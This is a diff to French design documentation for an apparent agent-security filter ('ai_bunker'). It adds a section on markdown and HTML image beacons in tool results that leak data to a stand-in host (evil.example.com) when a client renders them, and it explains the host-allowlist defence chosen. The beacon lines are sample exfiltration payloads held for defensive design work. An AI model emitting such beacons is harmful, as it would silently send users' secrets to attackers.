@@ -914,6 +914,79 @@ plancher passe de 607 à 723 jetons par requête, 19 % de plus, parce que le
 français est plus long que l'anglais. C'est le prix de standards lisibles par
 l'équipe qui les a écrits, énoncé plutôt que caché.
 
+### La sortie qui exfiltre simplement parce qu'on la regarde
+
+Un résultat d'outil revient en portant une ligne :
+
+```markdown
+![](https://evil.example.com/p.gif?d=c2VjcmV0LXBheWxvYWQ)
+```
+
+Rien ne demande à l'agent d'envoyer quoi que ce soit : `injection.exfiltration`,
+qui cherche une *demande* d'envoi, n'a rien à apparier. Dès qu'un client rend ce
+texte — panneau de conversation, aperçu d'éditeur, tableau de bord — le moteur
+de rendu va chercher cette adresse web (URL) et sa chaîne de requête arrive
+dans le journal d'accès de quelqu'un d'autre. Le moteur de rendu est le coursier.
+
+**La charge utile ne peut pas être le signal, et le découvrir est toute la
+conception.** Un phare portant `?s=AKIAIOSFODNN7EXAMPLE` était déjà attrapé —
+par `global.aws_access_key`, parce que la valeur volée ressemblait par hasard à
+une clé. C'est de la chance. Le même phare portant du base64 n'appariait rien.
+
+Trois façons de faire de la charge utile le signal ont donc été essayées puis
+écartées, chacune pour une raison que ce projet avait déjà payée une fois :
+
+| Écarté | Pourquoi |
+|---|---|
+| Un seuil de longueur sur la chaîne de requête | La suppression d'`injection.hidden_text` a enseigné exactement ceci : **leur seuil *était* le contournement**. Un phare sous la limite est un phare. |
+| Énumérer les noms de paramètres (`d`, `s`, `data`, `log`) | L'attaquant choisit le nom : l'espace est infini. C'est l'erreur que les règles de dépendances ont cessé de commettre. |
+| Neutraliser par défaut | Cela édite du texte qu'une personne va lire, et la règle arrêtée ici est que les caractères sans glyphe peuvent être retirés et le contenu porteur de sens non. |
+
+Ce qui survit n'a rien à contourner : **une liste blanche d'hôtes dont le
+contenu non fiable peut se télécharger lui-même.** C'est le modèle de la
+Content Security Policy, et il tient parce qu'il ne raisonne jamais sur la
+charge utile. Un hôte est sur la liste ou il n'y est pas.
+
+```yaml
+render:
+  allow_hosts: [img.shields.io]   # les badges restent silencieux
+  neutralise: false               # le signaler, ou l'arrêter
+```
+
+La liste est livrée **vide** plutôt que porteuse d'un avis, parce qu'autoriser
+un hôte, c'est lui faire confiance pour ne pas faire suivre — et un service de
+badges doté d'un point d'entrée `?url=` blanchirait précisément ce que ceci est
+censé attraper. C'est une décision d'exploitant, donc l'exploitant la prend.
+
+Énumérer les *formes* n'est pas l'erreur écartée, et la différence vaut d'être
+dite parce qu'elle paraît identique. Un nom de paramètre, c'est l'attaquant qui
+le choisit. L'ensemble des constructions qu'un moteur de rendu va chercher sans
+qu'on le lui demande appartient au HyperText Markup Language (HTML) : fini,
+publié, le même pour tout le monde. L'énumérer est le geste qui marche, comme énumérer les métacaractères du
+shell.
+
+**Deux paliers**, la forme que le rug pull emploie déjà. *Signalé* par défaut :
+les hôtes sont nommés, dans la note de l'agent et dans le journal de décision,
+et pas un octet de la sortie n'est touché. *Neutralisé* sur
+`render.neutralise: true`, pour un exploitant qui sait que ses clients rendent
+du markdown non fiable :
+
+```text
+![alt](https://evil.example.com/p.gif?d=…)   ->  [alt](https://evil.example.com/p.gif?d=…)
+<img src="https://evil.example.com/p.gif">   ->  <img data-ai-bunker-blocked-src="…">
+```
+
+**Rien n'est supprimé.** Chaque URL reste lisible et chaque édition réversible
+par un humain, ce qui en fait une chose défendable à faire au document de
+quelqu'un — et ça reste une édition, d'où le fait que ce soit désactivé jusqu'à
+demande.
+
+La note nomme l'**hôte** et jamais l'URL. La chaîne de requête d'un phare *est*
+la donnée volée, et la répéter remettrait les octets exfiltrés dans la fenêtre
+de contexte une seconde fois tout en expliquant qu'ils étaient volés. Le journal
+de décision suit la même règle et conserve la destination, qui est le seul fait
+dont un incident a besoin : il faut bien dire à quelqu'un où ça allait.
+
 ### L'outil qui a été approuvé, puis a changé
 
 Filtrer une déclaration d'outil attrape ce qu'elle **dit**. Cela n'attrape pas
@@ -1899,7 +1972,7 @@ ce tableau le dit.
 | `ai_bunker/sizing.py` + `report.py` — modèle, catalogue, CLI | ✅ |
 | `docs/SIZING.md` — la décision d'achat, chiffrée | ✅ |
 | `ai_bunker/budget.py` — comptabilité de tokens, détaillée et bloquante | ✅ |
-| 1037 tests, `ruff` propre | ✅ |
+| 1071 tests, `ruff` propre | ✅ |
 | `scripts/lint_acronyms.py` — chaque sigle explicité avant usage | ✅ |
 | `ai_bunker/budget.py` — comptabilité de tokens côté serveur | ✅ |
 | `ai_bunker/charter.py` — index, fiches à la demande, empreinte | ✅ |
